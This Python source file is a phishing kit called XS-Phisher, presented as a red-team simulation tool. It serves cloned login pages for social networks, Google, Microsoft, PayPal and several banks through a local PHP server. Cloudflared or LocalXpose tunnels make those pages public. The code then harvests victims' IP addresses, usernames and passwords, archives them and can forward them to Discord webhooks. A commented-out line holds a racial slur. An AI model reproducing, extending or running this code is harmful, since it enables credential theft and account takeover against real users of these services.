import os
import re
import sys 
import subprocess
import time
import threading
import zipfile
import requests
import base64
import json
import shutil
import psutil
import platform
import urllib.request
from urllib.parse import urlparse
from colorama import init, Style, Fore                                       #type: ignore

if os.path.exists("/data/data/com.termux/files/home"):
    Termux = True
else:
    Termux = False

R = Fore.RED
B = Fore.BLUE
C = Fore.CYAN
Y = Fore.YELLOW
G = Fore.GREEN
M = "\033[35m"
O = "\033[33m"
W = "\033[37m"

r = Style.RESET_ALL

class Software_info:
    app_authors = ("bithub", "bsux")
    app_version = 1
    
    app_name = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
    app_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
    current_path = os.getcwd()

    app_hash = ""

about_banner = fr"""{G}
            ┌──────────────────────────────────────────────────────────────┐
            │                          XS-PHISHER                          │
            ├──────────────────────────────────────────────────────────────┤
            │ XS-PHISHER is an automated web phishing simulation builder   │
            │ designed for red team operations, security testing, and      │
            │ awareness training scenarios.                                │
            │                                                              │
            │ Create, customize, and generate realistic credential         │
            │ harvesting pages through a guided workflow — without         │
            │ manual setup or repetitive configuration.                    │
            │                                                              │
            │ Built for controlled environments to evaluate human-factor   │
            │ security posture and phishing resilience.                    │
            │                                                              │
            │ Modular. Automated. Red-Team Ready.                          │
            └──────────────────────────────────────────────────────────────┘{r}
"""


                                                                         
banner_art = f"""
            \033[38;2;230;200;255m██╗  ██╗███████╗      ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
            \033[38;2;210;170;255m╚██╗██╔╝██╔════╝      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗    
            \033[38;2;190;140;255m ╚███╔╝ ███████╗█████╗██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
            \033[38;2;170;110;255m ██╔██╗ ╚════██║╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
            \033[38;2;150;80;240m██╔╝ ██╗███████║      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
            \033[38;2;130;60;220m╚═╝  ╚═╝╚══════╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
            \033[38;2;110;40;200m
                        \033[38;2;230;200;255mA Modern Automated Web-Phishing Tool For Red Teaming\033[38;2;75;0;130m
                                                         
                                          Authors : \033[38;2;150;80;240m{Software_info.app_authors[0]}, {Software_info.app_authors[1]}
                                          \033[38;2;75;0;130mVersion : \033[38;2;150;80;240m{Software_info.app_version}v
"""
main_menu_art = """\033[38;2;75;0;130m
            ╔══(1) Start Building
            ║
            ╠═══(2) About
            ║
            ╠════(3) Settings
            ║
            ╚═╦═══(4) Exit
              ║
"""
user_input_field = "              ╚════════▶ \033[0m\033[33m"

xs_phisher_banner_smoll = fr"""
                    {"\033[38;2;190;140;255m"} __  _____     ___ _    _    _            
                    {"\033[38;2;170;110;255m"} \ \/ / __|___| _ \ |_ (_)__| |_  ___ _ _ 
                    {"\033[38;2;150;80;240m"}  >  <\__ \___|  _/ ' \| (_-< ' \/ -_) '_|
                    {"\033[38;2;130;60;220m"} /_/\_\___/   |_| |_||_|_/__/_||_\___|_|   Ver: {B}{Software_info.app_version}v{r}, Author: {B}{Software_info.app_authors[0]}
                    {"\033[38;2;110;40;200m"}   
"""

xs_phisher_banner_small_rainbow = fr"""
                {"\033[38;2;190;140;255m"} _  _  ____      ____  _  _  __  ____  _  _  ____  ____ 
                {"\033[38;2;170;110;255m"}( \/ )/ ___) ___(  _ \/ )( \(  )/ ___)/ )( \(  __)(  _ \
                {"\033[38;2;150;80;240m"} )  ( \___ \(___)) __/) __ ( )( \___ \) __ ( ) _)  )   /
                {"\033[38;2;130;60;220m"}(_/\_)(____/    (__)  \_)(_/(__)(____/\_)(_/(____)(__\_)
                {"\033[38;2;110;40;200m"}               Ver: {B}{Software_info.app_version}v{r}, Author: {B}{Software_info.app_authors[0]}
"""

xs_phisher_bank_banner = fr"""
                {"\033[38;2;150;255;150m"} /$$   /$$           /$$$$$$$  /$$       /$$           /$$
                {"\033[38;2;150;255;150m"}| $$  / $$          | $$__  $$| $$      |__/          | $$              
                {"\033[38;2;100;220;100m"}|  $$/ $$/  /$$$$$$$| $$  \ $$| $$$$$$$  /$$  /$$$$$$$| $$$$$$$ 
                {"\033[38;2;100;220;100m"} \  $$$$/  /$$_____/| $$$$$$$/| $$__  $$| $$ /$$_____/| $$__  $$ 
                {"\033[38;2;50;200;50m"}  >$$  $$ |  $$$$$$|| $$____/ | $$  \ $$| $$|  $$$$$$ | $$  \ $$|
                {"\033[38;2;50;200;50m"} /$$/\  $$ \____  $$| $$      | $$  | $$| $$ \____  $$| $$  | $$|
                {"\033[38;2;20;160;20m"}| $$  \ $$ /$$$$$$$/| $$      | $$  | $$| $$ /$$$$$$$/| $$  | $$|
                {"\033[38;2;20;160;20m"}|__/  |__/|_______/ |__/      |__/  |__/|__/|_______/ |__/  |__/      
                {"\033[38;2;0;120;0m"}               Ver: {B}{Software_info.app_version}v{r}, Author: {B}{Software_info.app_authors[0]}
                {"\033[38;2;0;120;0m"}           An Automated Phishing Framework For Bank Websites                                                                           
                                                                                           
                                                                                           
"""

site_opt = fr"""{M}
        [01] Facebook       [11] Twitch         [21] Coming Soon
        [02] Instagram      [12] Snapchat       [22] Coming Soon
        [03] Netflix        [13] Reddit         [23] Coming Soon
        [04] Google         [14] Roblox         [25] Coming Soon
        [05] Microsoft      [15] Xbox
        [06] {O}Coming Soon{M}    [16] Playstation
        [07] Twitter        [17] {O}Coming Soon{M}
        [08] TikTok         [18] Spotify
        [09] Discord        [19] GitHub
        [10] MediaFire      [20] DropBox

        [99] Custom Templates                   [00] Exit
"""

site_opt_banks = fr"""{G}
        [01] Bank of America  [11] Coming Soon    [21] Coming Soon
        [02] Chase            [12] Coming Soon    [22] Coming Soon
        [03] PNB              [13] Coming Soon    [23] Coming Soon
        [04] LandBank         [14] Coming Soon    [25] Coming Soon
        [05] BDO              [15] Coming Soon
        [06] Paypal           [16] Coming Soon
        [07] Coming Soon      [17] Coming Soon
        [08] Coming Soon      [18] Coming Soon
        [09] Coming Soon      [19] Coming Soon
        [10] Coming Soon      [20] Coming Soon

        [99] {Y}Custom Templates{G}                   [00] {R}Exit

"""

opt_main_menu = fr"""{M}
                ╔════════════════════════════════════════╗
                ║           SELECT A CATEGORY            ║
                ╠════════════════════════════════════════╣
                ║                                        ║
                ║   {C}[01]{M} Social Networks                 ║
                ║   {C}[02]{M} Shopping Sites                  ║
                ║   {C}[03]{M} Banking Sites                   ║
                ║                                        ║
                ╠════════════════════════════════════════╣
                ║   {Y}[99]{M} Custom Templates                ║
                ║   {R}[00]{M} Exit                            ║
                ╚════════════════════════════════════════╝{r}
"""

class Settings:
    FILE = os.path.join(Software_info.current_path, "settings.json")

    @staticmethod
    def load():
        if not os.path.exists(Settings.FILE):
            Settings.save({
                "webhooks": {"discord": []},
                "network": {"host": "127.0.0.1", "port": 8080},
                "use_webh": False
            })

            Utilities.pretty_print("Using Default Settings. . .", "info")

        with open(Settings.FILE, "r") as f:
            return json.load(f)

    @staticmethod
    def save(data):
        with open(Settings.FILE, "w") as f:
            json.dump(data, f, indent=4)

    @staticmethod
    def use_webh_checker(cfg):
        use_webh = cfg.get("use_webh")
        return use_webh

    @staticmethod
    def use_webhook(cgf):

        Exit = False
        
        while not Exit:
            Utilities.clear_screen()
            use_wh = cgf.get("use_webh")
            print(f"{G}Use webhook? {R}: {B} {use_wh}\n")
            opt = input(user_input_field).lower().strip()

            if opt in ("true", "yes", 'y', "01", '1'):
                cgf["use_webh"] = True
                Settings.save(cgf)

            elif opt in ("false", "no", 'n', "00", '0'):
                cgf["use_webh"] = False
                Settings.save(cgf)

            elif opt in ("exit", "quit", 'x', 'q'):
                Exit = True

            else:
                Utilities.pretty_print("Not A Valid Command. . .", "error")

        input(f"{B}             Press Enter To Continue . . .")
        
    @staticmethod
    def view_webhooks(cfg):
        hooks = cfg.get("webhooks", {}).get("discord", [])

        print("\nDiscord Webhooks:\n")

        if not hooks:
            print("  (none)")

        for i, h in enumerate(hooks, 1):
            print(f"[{i}] {h}")

        input("\nPress Enter...")

    @staticmethod
    def add_webhook():
        cfg = Settings.load()

        url = input("Enter Discord webhook URL: ").strip()

        if url:
            cfg["webhooks"]["discord"].append(url)
            Settings.save(cfg)
            Utilities.pretty_print("Webhook added", "info")

        input("Press Enter...")

    @staticmethod
    def remove_webhook(cfg):
        hooks = cfg.get("webhooks", {}).get("discord", [])

        if not hooks:
            print("No webhooks configured.")
            input("Press Enter...")
            return

        for i, h in enumerate(hooks, 1):
            print(f"[{i}] {h}")

        idx = input("Select webhook number: ").strip()

        if idx.isdigit():
            i = int(idx) - 1
            if 0 <= i < len(hooks):
                hooks.pop(i)
                Settings.save(cfg)
                Utilities.pretty_print("Webhook removed", "info")

        input("Press Enter...")

    @staticmethod
    def reset_settings():
        Settings.save({
            "webhooks": {"discord": []},
            "network": {"host": "127.0.0.1", "port": 8080},
            "use_webh": False
        })

        Utilities.pretty_print("Settings reset", "warning")
        input("Press Enter...")


class Webhook:

    @staticmethod
    def send(message: str):
        cfg = Settings.load()
        hooks = cfg.get("webhooks", {}).get("discord", [])

        if not hooks:
            Utilities.pretty_print("No webhook configured", "warning")
            return

        payload = {"content": message}

        for url in hooks:
            try:
                r = requests.post(url, json=payload, timeout=5)
                if r.status_code not in (200, 204):
                    Utilities.pretty_print(
                        f"Webhook failed ({r.status_code}) → {r.text}",
                        "error"
                    )
            except Exception as e:
                Utilities.pretty_print(e, "error")

    @staticmethod
    def send_creds(username, password):
        Webhook.send(f"Captured credentials\nUser: {username}\nPass: {password}")
        pass

    @staticmethod
    def send_ip(ip):
        Webhook.send(f"IP captured: {ip}")
        pass

    @staticmethod
    def add_discord_webhook():
        cfg = Settings.load()

        url = input("Enter Discord webhook URL: ").strip()

        if url:
            cfg["webhooks"]["discord"].append(url)
            Settings.save(cfg)
            Utilities.pretty_print("Webhook added", "info")

class Utilities:

    @staticmethod
    def clear_screen():
        os.system("clear" if os.name != "nt" else "cls")

    @staticmethod
    def base64_decode(string):
        return base64.b64decode(string)
    
    @staticmethod
    def base64_encode(string):
        return base64.b64encode(string)
    
    @staticmethod
    def reverse_string(string):
        return string[::-1]
    
    @staticmethod
    def auto_update(): #checks for update on github
        pass

    @staticmethod # universal killing process method
    def kill_process_by_name(proc_name):
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() == proc_name.lower():
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

    @staticmethod
    def killtask():
        check_pid = ("apache2", "php", "loclx", "cloudflared")

        for proc in check_pid:
            try:
                #subprocess.run(['killall', proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                Utilities.kill_process_by_name(proc)
            except Exception as e:
                print("[!] Failed to Terminate Program. . .")

        return

    @staticmethod
    def pretty_print(string, val):

        if val == "warning":
            return print(f"{Y}[!!WARNING!!] {string}")
        
        elif val == "info":
            return print(f"{Y}[INFO] {string}")
        
        elif val == "error":
            return print(f"{R}[ERROR] {string}")
        
        else:
            return print(f"{Y}[DEBUG_ERROR] It's Not a Valid String!!\n")
        
class Install_package:

    @staticmethod
    def download(url, dest):
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        print(f"Downloading {url} -> {dest}")
        urllib.request.urlretrieve(url, dest)
        os.chmod(dest, 0o755)  # make it executable

    @staticmethod
    def download_and_extract(url, dest):
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        zip_path = dest + ".zip"

        print(f"Downloading {url} -> {zip_path}")
        urllib.request.urlretrieve(url, zip_path)

        print(f"Extracting {zip_path}...")
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(os.path.dirname(dest))

        os.remove(zip_path)  # cleanup zip after extraction
        os.chmod(dest, 0o755)  # make it executable

    @staticmethod
    def install_cloudflared():
        if os.path.exists(".server/cloudflared"):
            print("[+] Cloudflared already installed.")
        else:
            print("[*] Installing Cloudflared...")
            arch = platform.machine()

            base_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/"

            if "arm" in arch or "Android" in arch:
                url = base_url + "cloudflared-linux-arm"
            elif "aarch64" in arch:
                url = base_url + "cloudflared-linux-arm64"
            elif "x86_64" in arch:
                url = base_url + "cloudflared-linux-amd64"
            else:
                url = base_url + "cloudflared-linux-386"

            Install_package.download(url, ".server/cloudflared")

    @staticmethod
    def install_localxpose():
        if os.path.exists(".server/loclx"):
            print("[+] LocalXpose already installed.")
        else:
            print("[*] Installing LocalXpose...")
            arch = platform.machine()

            base_url = "https://api.localxpose.io/api/v2/downloads/"

            if "arm" in arch or "Android" in arch:
                url = base_url + "loclx-linux-arm.zip"
            elif "aarch64" in arch:
                url = base_url + "loclx-linux-arm64.zip"
            elif "x86_64" in arch:
                url = base_url + "loclx-linux-amd64.zip"
            else:
                url = base_url + "loclx-linux-386.zip"

            Install_package.download_and_extract(url, ".server/loclx")

class Banking_Sites:
    # for the banking site
    def __init__(self, core):
        self.core = core
        pass

    # main menu for banks options
    def main_menu(self):
        path = Software_info.current_path + "/.websites/"
        path2serv = Software_info.current_path + "/.server/www/"
        while True:
            Utilities.clear_screen()
            print(xs_phisher_bank_banner)
            print(site_opt_banks)
            user_input = input(user_input_field).lower()

            sites = {
                ("01", "1", "bankofamerica", "bank of america", "bank-of-america", "boa"):       "boa",
                ("02", "2", "chase"):      "chase",
                ("03", "3", "pnb"):        "pnb",
                ("04", "4", "landbank"):         "landbank",
                ("05", "5", "bdo"):      "bdo",
                ("06", "6", "paypal"):         "paypal",
                ("21", "22", "23", "25"):      None,  # Coming Soon
            }

            # match user input to a site
            matched_site = None
            is_coming_soon = False

            for keys, site in sites.items():
                if user_input in keys:
                    matched_site = site
                    is_coming_soon = site is None
                    break

            if user_input in ("00", "0", "exit", "x", "q", "quit"):
                break

            elif user_input in ("99", "custom-plate", "custom-template", "custom-plates", "custom-templates"):
                Utilities.pretty_print("Still under Development!~", "warning")
                input("Press Enter To Continue. . .")
                custom_plate = Custom_Template()
                custom_plate.main()

            elif is_coming_soon:
                Utilities.pretty_print("Coming Soon!~", "warning")
                input("Press Enter To Continue. . .")

            elif matched_site:
                Utilities.pretty_print("Still under Development!~", "warning")
                input("Press Enter To Continue. . .")
                host, port = self.core.ask_host()
                self.core.set_server_now(path2serv, path, matched_site)
                self.core.start_php_server(path2serv, host, port)

            else:
                Utilities.pretty_print("Not a Valid Option!", "error")
                input("Press Enter To Continue. . .")

        return
    

class Tunnel:

    @staticmethod
    def ask_tunnel(host, port):
        try:
            while True:
                Utilities.clear_screen()
                print(banner_art)
                print("\n\n")
                print(fr"""
                    Select Which Host You Want to Use. . .
                    {R}[01]{r} {C}Localhost
                    {G}[02]{r} {C}Cloudflared  {R}[Auto Detects]
                    {B}[03]{r} {C}LocalXpose   {G}[NEW! Max 15Min]
                    {R}[04]{r} {C}Ngrok        {R}[!! Removed !!]
                    {r}"""
                )
                user_in = input(user_input_field).lower().strip()

                if user_in in ("01", "1", "localhost"):
                    break
                
                elif user_in in ("02", "2", "cloudflared"):
                    threading.Thread(target=Tunnel.start_cloudflared, args=(host, port), daemon=True).start()
                    break
                
                elif user_in in ("03", "3", "localxpose"):
                    threading.Thread(target=Tunnel.start_loclx, args=(host, port), daemon=True).start()
                    break

                elif user_in in ("04", "4", "ngrok"):
                    Utilities.pretty_print("This Feature had been removed!", "warning")
                    input("Press Enter To Continue. . .")
                    continue
                
                else:
                    Utilities.pretty_print("Please make sure to Enter a valid command!", "error")
                    continue

        except KeyboardInterrupt:
            Utilities.pretty_print("Returning to Menu. . .", "info")
            time.sleep(1)
            
        return


    @staticmethod
    def start_cloudflared(host, port):
        # install required packages
        Install_package.install_cloudflared()
        # cleanup old log
        try:
            os.remove(".server/.cld.log")
        except FileNotFoundError:
            pass

        print(f"[*] Initializing... ( http://{host}:{port} )")
        time.sleep(1)

        print("[*] Launching Cloudflared...")

        is_termux = shutil.which("termux-chroot") is not None
        cmd = []

        if is_termux:
            cmd = ["termux-chroot", "./.server/cloudflared", "tunnel",
                   "-url", f"{host}:{port}", "--logfile", ".server/.cld.log"]
        else:
            cmd = ["./.server/cloudflared", "tunnel",
                   "-url", f"{host}:{port}", "--logfile", ".server/.cld.log"]

        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(8)

        with open(".server/.cld.log", "r") as f:
            log = f.read()

        match = re.search(r'https://[-0-9a-z]*\.trycloudflare\.com', log)
        cldflr_url = match.group(0) if match else None
        print(f"URL : {cldflr_url}")
        #custom_url(cldflr_url)
        #capture_data()

    @staticmethod
    def localxpose_auth():
        subprocess.Popen(["./.server/loclx", "-help"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

        # find auth file
        if os.path.isdir(".localxpose"):
            auth_f = ".localxpose/.access"
        else:
            auth_f = os.path.join(os.path.expanduser("~"), ".localxpose/.access")

        # check if account has error
        result = subprocess.run(["./.server/loclx", "account", "status"],
                                capture_output=True, text=True)

        if "Error" in result.stdout:
            print("\n[!] Create an account on localxpose.io & copy the token\n")
            time.sleep(3)
            loclx_token = input("[-] Input Loclx Token: ").strip()

            if not loclx_token:
                print("\n[!] You have to input Localxpose Token.")
                time.sleep(2)
                #tunnel_menu()
            else:
                with open(auth_f, "w") as f:
                    f.write(loclx_token)

    @staticmethod
    def start_loclx(host, port):
        # install required package
        Install_package.install_localxpose()
        print(f"[*] Initializing... ( http://{host}:{port} )")
        time.sleep(1)
        Tunnel.localxpose_auth()

        opinion = input("[?] Change Loclx Server Region? [y/N]: ").strip().lower()
        loclx_region = "eu" if opinion == "y" else "us"

        print("[*] Launching LocalXpose...")

        is_termux = shutil.which("termux-chroot") is not None

        if is_termux:
            cmd = ["termux-chroot", "./.server/loclx", "tunnel",
                   "--raw-mode", "http", "--region", loclx_region,
                   "--https-redirect", "-t", f"{host}:{port}"]
        else:
            cmd = ["./.server/loclx", "tunnel",
                   "--raw-mode", "http", "--region", loclx_region,
                   "--https-redirect", "-t", f"{host}:{port}"]

        with open(".server/.loclx", "w") as log_file:
            subprocess.Popen(cmd, stdout=log_file, stderr=log_file)

        time.sleep(12)

        with open(".server/.loclx", "r") as f:
            log = f.read()

        match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', log)
        loclx_url = match.group(0) if match else None
        print(f"URL : {loclx_url}")
        #custom_url(loclx_url)
        #capture_data()

class Custom_Template:
    
    def __init__(self):
        pass

    def main(self):
        try:
            while True:
                Utilities.clear_screen()
                print(banner_art)
                print(f"{B}Enter URL to clone: (e.g; https://roblox.com/)")
                user_inp = input(user_input_field).strip()
                parsed = urlparse(user_inp)
                if parsed.scheme in ("https", "http"):
                    domain_name = parsed.netloc          # "roblox.com"
                    self.core_cust(site=user_inp, domain=domain_name)
                    input()
                    pass

                else:
                    Utilities.pretty_print("Make sure the URL starts with \"https:// or http://\"", "error")
                    input("Press Enter To Continue. . .")

        except KeyboardInterrupt:
            Utilities.pretty_print("Returning to Menu. . .", "info")
            time.sleep(1)
            return
        

    def core_cust(self, site, domain):
        Utilities.pretty_print("Cloning the Website Please Wait. . .", "info")
        path = Software_info.current_path
        base_path = os.path.join(path, ".custom-sites/")

        try:
            result = subprocess.run([
                "pagesource",
                site,
                "--wait", "5",
                "--include-external",
                "-o", domain.split('.')[0]
            ], 
            cwd=base_path,
            capture_output=True,
            text=True)
           
            Utilities.pretty_print(result.stdout, "info")
            if result.stderr:
                Utilities.pretty_print(result.stderr, "error")

        except Exception as e:
            print(e)

class Core_Program:

    def __init__(self): # put init codes later
        self.program_setup()

        WATCH_DIR = os.path.join(Software_info.current_path, ".server", "www")
        ARCHIVE_DIR = os.path.join(Software_info.current_path, "auth")

        self.ip_file = os.path.join(WATCH_DIR, "ip.txt")
        self.creds_file = os.path.join(WATCH_DIR, "usernames.txt")

        self.archive_ip = os.path.join(ARCHIVE_DIR, "ip.txt")
        self.archive_creds = os.path.join(ARCHIVE_DIR, "usernames.dat")

        self.banking = Banking_Sites(self)
        pass

    def capture_ip(self):
        with open(self.ip_file, "r") as f:
            content = f.read()

        ip = ""
        for line in content.splitlines():
            if "IP:" in line:
                ip = line.split("IP:")[-1].strip()

        print(f"[+] IP Found: {ip}")
        print(f"[+] Saved in: {self.archive_ip}")

        with open(self.archive_ip, "a") as out:
            out.write(content)

        cgf = Settings.load()
        if Settings.use_webh_checker(cgf):
            Webhook.send_ip(ip)


    def capture_creds(self):
        username = ""
        password = ""

        with open(self.creds_file, "r") as f:
            for line in f:
                line = line.strip()

                if "Username:" in line:
                    username = line.split("Username:")[1].split("Pass:")[0].strip()

                if "Pass:" in line:
                    password = line.split("Pass:")[1].strip()

        print(f"[+] {G}Account: {Y}{username}")
        print(f"[+] {R}Password: {Y}{password}")
        print(f"[+] {B}Saved in: {Y}{self.archive_creds}")

        with open(self.archive_creds, "a") as out:
            with open(self.creds_file, "r") as src:
                out.write(src.read())
        
        cgf = Settings.load()
        if Settings.use_webh_checker(cgf):
            msg = fr"""
                    ```
                    [+] Account : {username}
                    [+] Password : {password}
                    ```
                    """
            Webhook.send(msg)


    def capture_data(self):
        print(f"[*] Waiting for log files... {B}Ctrl{R}+{B}C {W}to exit")

        while True:
            if os.path.exists(self.ip_file):
                print(f"\n[+] {G}IP log detected")
                self.capture_ip()
                os.remove(self.ip_file)

            time.sleep(0.75)

            if os.path.exists(self.creds_file):
                print(f"\n[+] {G}Credential log detected")
                self.capture_creds()
                os.remove(self.creds_file)

            time.sleep(0.75)


    def start_php_server(self, path, host, port):
        Utilities.pretty_print("Starting PHP Server. . .", "info")
        time.sleep(1)
        Tunnel.ask_tunnel(host, port)
        
        try:
            subprocess.Popen(
                ["php", "-S", f"{host}:{port}", "-t", path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            Utilities.pretty_print("Successfully Started Server. . .", "info")
            print(f"[*] Hosting at {B}http://{host}{R}:{B}{port}/ {W}. . .")

            self.capture_data()   # BLOCK HERE

            
        except KeyboardInterrupt:
            pass

        except Exception as e:
            Utilities.pretty_print(e, "error")

        finally:

            proc.terminate() #type: ignore
            Utilities.pretty_print("Server stopped.", "info")

    def ask_host(self):
        print(f"{G}Enter Host {B}(e.g; example.com)\n{G}Press Enter for Default")
        host = input(user_input_field).lower().strip()
        print(f"{G}Enter Port {B}(e.g; 8080)\n{G}Press Enter for Default")
        port_int = input(user_input_field).strip()
        if host == '':
            host = "127.0.0.1"
            Utilities.pretty_print("Using Default >> 127.0.0.1", "info")

        if port_int == '':
            port = 8080
            Utilities.pretty_print("Using Default >> 8080", "info")

        else:
            port = int(port_int)

        return host, port 

    
    def main(self): # where the core program starts
        path = Software_info.current_path + "/.websites/"
        path2serv = Software_info.current_path + "/.server/www/"
        while True:
            Utilities.clear_screen()
            print(xs_phisher_banner_smoll)
            print(site_opt)
            user_input = input(user_input_field).lower()

            sites = {
                ("01", "1", "facebook"):       "facebook",
                ("02", "2", "instagram"):      "instagram",
                ("03", "3", "netflix"):        "netflix",
                ("04", "4", "google"):         "google",
                ("05", "5", "microsoft"):      "microsoft",
                ("06", "6", "paypal"):         "paypal",
                ("07", "7", "twitter"):        "twitter",
                ("08", "8", "tiktok"):         "tiktok",
                ("09", "9", "discord"):        "discord",
                ("10", "mediafire"):           "mediafire",
                ("11", "twitch"):              "twitch",
                ("12", "snapchat"):            "snapchat",
                ("13", "reddit"):              "reddit",
                ("14", "roblox"):              "roblox",
                ("15", "xbox"):                "xbox",
                ("16", "playstation"):         "playstation",
                ("17", "landbank"):            "landbank",
                ("18", "spotify"):             "spotify",
                ("19", "github"):              "github",
                ("20", "dropbox"):             "dropbox",
                ("21", "22", "23", "25"):      None,  # Coming Soon
            }

            # match user input to a site
            matched_site = None
            is_coming_soon = False

            for keys, site in sites.items():
                if user_input in keys:
                    matched_site = site
                    is_coming_soon = site is None
                    break

            if user_input in ("00", "0", "exit", "x", "q", "quit"):
                break

            elif user_input in ("99", "custom-plate", "custom-template", "custom-plates", "custom-templates"):
                Utilities.pretty_print("Still under Development!~", "warning")
                input("Press Enter To Continue. . .")
                custom_plate = Custom_Template()
                custom_plate.main()

            elif is_coming_soon:
                Utilities.pretty_print("Coming Soon!~", "warning")
                input("Press Enter To Continue. . .")

            elif matched_site:
                Utilities.pretty_print("Still under Development!~", "warning")
                input("Press Enter To Continue. . .")
                host, port = self.ask_host()
                self.set_server_now(path2serv, path, matched_site)
                self.start_php_server(path2serv, host, port)

            else:
                Utilities.pretty_print("Not a Valid Option!", "error")
                input("Press Enter To Continue. . .")

        return
    
    @staticmethod
    def install_dep():
        global Termux
        Utilities.pretty_print("Installing Dependencies. . .","info")
        fail = False
        if Termux:
            pkgs = ("php", "apache2", "curl", "install proot resolv-conf")
            for pkg in pkgs:
                try:
                    os.system(f"pkg install {pkg} -y")
                
                except Exception as e:
                    Utilities.pretty_print(e, "error")
                    fail = True

        else:
            packages = ("php", "apache2", "curl")
            for pkg in packages:
                try:
                    os.system(f"apt install {pkg} -y")
                
                except Exception as e:
                    Utilities.pretty_print(e, "error")
                    fail = True

        return fail
    
    def main_menu(self): #main menu of the program
        while True:
            Utilities.clear_screen()
            print(xs_phisher_banner_small_rainbow)
            print(opt_main_menu)
            user_input = input(user_input_field).lower()

            if user_input in ("01", "1", "social-networks", "social networks"):
                self.main()


            elif user_input in ("02", "2", "shopping-sites", "shopping sites"):
                Utilities.pretty_print("Still Under Development!. . .", "warning")
                input("Press Enter To Continue. . .")
                pass

            elif user_input in ("03", "3", "banking-sites", "banking sites"):
                Utilities.pretty_print("Still Under Development!. . .", "warning")
                input("Press Enter To Continue. . .")
                self.banking.main_menu()
                pass

            elif user_input in ("99", "custom-plate", "custom-template", "custom-plates", "custom-templates"):
                Utilities.pretty_print("Still under Development!~", "warning")
                input("Press Enter To Continue. . .")
                custom_plate = Custom_Template()
                custom_plate.main()


            elif user_input in ("00", "0", "x", "q", "quit", "exit", "esc", "escape"):
                Utilities.pretty_print("Returning to Main Menu. . .", "info")
                time.sleep(1)
                break

            else:
                Utilities.pretty_print("Not a Valid Command!", "error")
                time.sleep(1)
                continue

        return


    def program_setup(self): # where users can finally configure
        path = Software_info.current_path + "/"
        if not os.path.exists(path + ".server/www/"):
            os.makedirs(path + ".server/www/")
        
        if not os.path.exists(path + ".websites/"):
            os.makedirs(path + ".websites/")

        if not os.path.exists(path + ".custom-sites/"):
            os.mkdir(path + ".custom-sites/")

        if not os.path.exists(path + "auth/"):
            os.mkdir(path + "auth/")

    def set_server_now(self, path2serv,path, site): # after the user configured and setted up the program, it will build now
        try:
            shutil.rmtree(path2serv, ignore_errors=True)
            path = path + site
            shutil.copytree(path,path2serv)
            ip_api = path + "/../ip.php"
            shutil.copy(ip_api, path2serv)
            Utilities.pretty_print("Successfully Setted up the Server. . .", "info")
            
        except Exception as e:
            Utilities.pretty_print(e, "error")

class Main_Program:

    def __init__(self):
        # just a normal initialization block
        init(autoreset=True)
        os.system("title XS-Phisher By Bithub")
        Utilities.killtask()
        fail2inst = Core_Program.install_dep()

        if fail2inst:
            #sys.exit()
            pass

        self.core = Core_Program()
        Settings.load()

    def main(self): #the main program are written here
        Utilities.pretty_print("Still under Development!~", "warning")
        self.core.main_menu()
        #input()
        return

    def main_menu(self):
        while True:
            Utilities.clear_screen()
            print(banner_art)
            user_input = input(main_menu_art + user_input_field).strip().lower()

            if user_input in ("01", "1", "start", "start building", "start-building"): # start main program
                self.main()
                pass
            
            elif user_input in ("02", "2", "help", "h", "?", "a", "about"): # enter user manual or help banner

                Utilities.clear_screen()
                print(xs_phisher_banner_smoll)
                print(about_banner)
                #Utilities.pretty_print("Still under Construction. . .", "info")
                input(f"{B}             Press Enter To Continue . . .")
                pass

            elif user_input in ("03", "3", "settings", "config", "setting"): # where users can configure their app settings
                Utilities.pretty_print("Still Under Development. . .", "warning")
                input(f"{B}             Press Enter To Continue . . .")
                self.settings_menu()
                pass
            
            elif user_input in ("04", "4", "exit", "quit", "x", "q"): # leave the program
                break
            
            else:
                #print("nigga put a valid command")
                Utilities.pretty_print("Please input a Valid Command", "warning")
                input()
                continue
              
        return
    
    def settings_menu(self):
        while True:
            Utilities.clear_screen()
            print(xs_phisher_banner_smoll + "\n")

            cfg = Settings.load()

            print(f"""
                            {B}========== SETTINGS =========={r}

                            [1] View Webhooks
                            [2] Add Discord Webhook
                            [3] Remove Discord Webhook
                            [4] Use Webhook {G if cfg.get("use_webh") == True else R}{cfg.get("use_webh")}{r}
                            [5] Reset Settings
                            [0] Back

                            {B}=============================={r}
    """)

            choice = input(user_input_field).strip()

            if choice == "1":
                Settings.view_webhooks(cfg)

            elif choice == "2":
                Settings.add_webhook()

            elif choice == "3":
                Settings.remove_webhook(cfg)

            elif choice == "4":
                Settings.use_webhook(cfg)

            elif choice == "5":
                Settings.reset_settings()

            elif choice == "0":
                break
            
            else:
                Utilities.pretty_print("Not A Valid Command. . .", "error")

    
if __name__ == "__main__":
   
  Main = Main_Program()

  try:

      Main.main_menu()

  except KeyboardInterrupt:
      Utilities.pretty_print("\n\nSession Interrupted By User. . .", "info")
  
  finally:
      Utilities.pretty_print("Quitting the program. . .\n", "info")
      sys.exit()